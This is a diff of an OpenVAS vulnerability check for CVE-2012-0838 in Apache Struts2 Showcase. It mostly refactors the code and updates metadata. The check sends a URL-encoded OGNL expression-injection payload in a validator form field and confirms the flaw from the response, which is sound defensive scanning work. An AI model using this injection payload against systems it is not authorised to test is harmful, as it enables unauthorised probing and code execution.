@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apache_struts_showcase_java_method_exec_vuln.nasl 5841 2017-04-03 12:46:41Z cfi $
+# $Id: gb_apache_struts_showcase_java_method_exec_vuln.nasl 9305 2018-04-04 14:20:54Z cfischer $
 #
 # Apache Struts2 Showcase Arbitrary Java Method Execution vulnerability
 #
@@ -28,13 +28,13 @@ CPE = "cpe:/a:apache:struts";
 
 if(description)
 {
-  script_id(802425);
-  script_version("$Revision: 5841 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.802425");
+  script_version("$Revision: 9305 $");
   script_cve_id("CVE-2012-0838");
   script_bugtraq_id(49728);
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:46:41 +0200 (Mon, 03 Apr 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-04-04 16:20:54 +0200 (Wed, 04 Apr 2018) $");
   script_tag(name:"creation_date", value:"2012-03-13 14:59:53 +0530 (Tue, 13 Mar 2012)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Apache Struts2 Showcase Arbitrary Java Method Execution vulnerability");
@@ -77,14 +77,6 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-asport = 0;
-asreq = "";
-asres = "";
-asRes = "";
-asReq = "";
-dir = "";
-url = "";
-
 if(!asport = get_app_port(cpe:CPE)){
   exit(0);
 }
@@ -95,45 +87,33 @@ if(!dir = get_app_location(cpe:CPE, port:asport)){
 
 host = http_host_name(port:asport);
 
-## Send and Receive the response
 asreq = http_get(item:string(dir,"/showcase.action"), port:asport);
-if(asreq)
-{
-  asres = http_keepalive_send_recv(port:asport, data:asreq);
+asres = http_keepalive_send_recv(port:asport, data:asreq);
+if(!asres) exit(0);
 
-  if(asres)
-  {
-    ## Confirm the application
-    if(">Showcase</" >< asres && ">Struts Showcase<" >< asres)
-    {
-      ## Construct the POST data
-      postdata = "requiredValidatorField=&requiredStringValidatorField" +
-                 "=&integerValidatorField=%22%3C%27+%2B+%23application" +
-                 "+%2B+%27%3E%22&dateValidatorField=&emailValidatorFie" +
-                 "ld=&urlValidatorField=&stringLengthValidatorField=&r" +
-                 "egexValidatorField=&fieldExpressionValidatorField=";
+if(">Showcase</" >< asres && ">Struts Showcase<" >< asres) {
 
-      url = dir + "/validation/submitFieldValidatorsExamples.action";
+  postdata = "requiredValidatorField=&requiredStringValidatorField" +
+             "=&integerValidatorField=%22%3C%27+%2B+%23application" +
+             "+%2B+%27%3E%22&dateValidatorField=&emailValidatorFie" +
+             "ld=&urlValidatorField=&stringLengthValidatorField=&r" +
+             "egexValidatorField=&fieldExpressionValidatorField=";
 
-      ## Construct the POST request
-      asReq = string("POST ", url," HTTP/1.1\r\n",
-                     "Host: ", host, "\r\n",
-                     "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
-                     "Content-Type: application/x-www-form-urlencoded\r\n",
-                     "Content-Length: ", strlen(postdata), "\r\n",
-                     "\r\n", postdata);
-      asRes = http_keepalive_send_recv(port:asport, data:asReq);
+  url = dir + "/validation/submitFieldValidatorsExamples.action";
 
-      if(asRes)
-      {
-        ##  Confirm the exploit
-        if(!isnull(asRes) &&(".template.Configuration@" >< asRes) &&
-           ">Struts Showcase<" >< asRes)
-        {
-          security_message(asRes);
-          exit(0);
-        }
-      }
-    }
+  asReq = string("POST ", url," HTTP/1.1\r\n",
+                 "Host: ", host, "\r\n",
+                 "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+                 "Content-Type: application/x-www-form-urlencoded\r\n",
+                 "Content-Length: ", strlen(postdata), "\r\n",
+                 "\r\n", postdata);
+  asRes = http_keepalive_send_recv(port:asport, data:asReq);
+
+  if( asRes && ".template.Configuration@" >< asRes && ">Struts Showcase<" >< asRes ) {
+    security_message(port:asport);
+    exit(0);
   }
+  exit(99);
 }
+
+exit(0);
